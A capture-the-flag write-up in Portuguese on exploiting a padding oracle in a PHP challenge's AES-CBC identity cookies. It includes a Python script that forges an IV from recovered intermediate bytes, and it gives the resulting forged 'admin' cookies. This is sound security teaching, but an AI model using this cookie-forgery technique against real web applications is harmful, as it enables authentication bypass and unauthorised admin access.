# Relatório de Exploração: Desafio Cybersecurity 2x2 - Padding Oracle

Este documento detalha o processo de análise e exploração da vulnerabilidade de *Padding Oracle* presente no desafio "Cybersecurity 2x2". O objetivo final era obter acesso administrativo à aplicação web para capturar a flag.

## 1. Análise da Vulnerabilidade

A aplicação utiliza o método de cifragem `aes-128-cbc` para gerir a identidade do utilizador através de cookies. Este modo de cifra é suscetível a ataques de *Padding Oracle* se a aplicação vazar informações sobre a validade do *padding* durante a decriptação.

A função `test_identity` no ficheiro `index.php` continha o oráculo: uma chamada `die("ERROR!")` que diferenciava uma decriptação falhada (provavelmente por *padding* incorreto) de uma bem-sucedida.

## 2. Desafios do Ambiente e Correções Aplicadas

A exploração "pura" do desafio foi impedida por duas falhas de design na aplicação, que exigiram modificações no código-fonte para serem contornadas.

### 2.1. Falha 1: Vulnerabilidade Inacessível

O código do oráculo em `test_identity` só era executado se a variável `$_SESSION['id']` estivesse definida. No entanto, esta variável era definida exclusivamente pela função `get_identity`, que por sua vez só era chamada após um login com nome de utilizador e senha bem-sucedido — um caminho impossível no desafio. Pois a base de dados não continha utilizadores e a exploração de outras vulnerabilidades como SQL Injection estava fora do escopo do desafio.

* **Correção Aplicada:** Alterou-se a verificação em `test_identity` de `$_SESSION['id']` para `$_COOKIE['ID']`. Isto tornou o oráculo acessível, pois o atacante pode controlar os cookies enviados ao servidor.

### 2.2. Falha 2: Lógica de Autorização Incompleta

Após explorar com sucesso o oráculo para forjar um cookie que decifrava para `"admin"`, a aplicação definia `$_SESSION['isadmin'] = true`. Contudo, o fluxo principal da página nunca verificava esta variável. Em vez disso, continuava a verificar `isset($_SESSION["id"])`, que nunca era definida pelo ataque, impedindo o utilizador de ver a página de sucesso.

* **Correção Aplicada:** Alterou-se a condição final de `if (isset($_SESSION["id"]))` para `if (isset($_SESSION["id"]) || (isset($_SESSION['isadmin']) && $_SESSION['isadmin'] === true))`, permitindo que a aplicação reconhecesse o sucesso do *exploit*.

## 3. Metodologia de Exploração

Com o ambiente corrigido, a exploração focou-se em forjar um par de cookies (`ID` e `token`) que resultasse no plaintext `"admin"` após a decriptação.

### 3.1. Tentativa de Automação com PadBuster

Foi feita uma tentativa de usar a ferramenta padrão `padbuster.pl`. Após a resolução de dependências Perl (`LWP::UserAgent`, `Crypt::SSLeay`), a ferramenta conseguiu interagir com o oráculo e decifrar blocos. No entanto, a opção `-encrypt` era consistentemente ignorada, impedindo a encriptação direta.

### 3.2. Exploração Manual com Bytes Intermediários

A estratégia foi alterada para uma abordagem manual:
1.  Executar o PadBuster no modo de decriptação (padrão) para um bloco de cifras conhecido (um bloco de 16 bytes nulos).
2.  Esta execução, embora decifrasse um texto sem sentido, revelou a informação mais crucial: os **Bytes Intermediários** resultantes da primeira fase da decifragem AES.
3.  Com os Bytes Intermediários em mãos, foi possível forjar o payload final sem depender da funcionalidade de encriptação do PadBuster, utilizando a fórmula: `IV_Forjado = Bytes_Intermediários XOR Plaintext_Desejado_Com_Padding`.

### 3.3. Construção do Payload Final

O payload foi construído com um script Python para garantir a precisão do cálculo criptográfico.

1.  **Plaintext Alvo:** `b"admin"`
2.  **Padding (PKCS#7):** O texto de 5 bytes foi preenchido para ter 16 bytes, adicionando 11 bytes com o valor `0x0b`.
    * `b'admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'`
3.  **Cálculo e Geração dos Cookies:**

    ```python
    import base64

    # Bytes intermediários obtidos na execução do PadBuster em modo de decriptação
    intermediate_hex = "e1c5601fabeffbe30dab31d9acf95c1a"
    intermediate_bytes = bytes.fromhex(intermediate_hex)


 # Plaintext alvo com o padding correto
    desired_plaintext = b'admin'
    padding_len = 16 - len(desired_plaintext)
    desired_plaintext_padded = desired_plaintext + bytes([padding_len]) * padding_len

    # Cálculo do IV forjado através da operação XOR
    forged_iv_bytes = bytearray()
    for i in range(16):
        forged_iv_bytes.append(intermediate_bytes[i] ^ desired_plaintext_padded[i])

    # O criptograma (cookie ID) pode ser um bloco nulo, pois foi a base do cálculo
    ciphertext_bytes = b'\x00' * 16

    # Codificação dos resultados para o formato de cookie
    cookie_id = base64.b64encode(ciphertext_bytes).decode('utf-8')
    cookie_token = base64.b64encode(forged_iv_bytes).decode('utf-8')

    print(f"Cookie 'ID'    ->  {cookie_id}")
    print(f"Cookie 'token' ->  {cookie_token}")
    ```

4.  **Payload Resultante:**
    * **Cookie 'ID':** `AAAAAAAAAAAAAAAAAAAAAA==`
    * **Cookie 'token':** `gKENdsXk8OgGoDrSp/JXEQ==`
  
# Conclusão
A captura da flag foi bem-sucedida após a inserção dos cookies gerados no navegador. O desafio provou ser mais complexo do que um simples ataque de *Padding Oracle*,
exigindo também a identificação e correção de múltiplas falhas de lógica na própria aplicação.
O processo demonstrou a importância da auditoria de código e da compreensão profunda dos mecanismos de ataque para contornar ambientes de desafio imperfeitos.
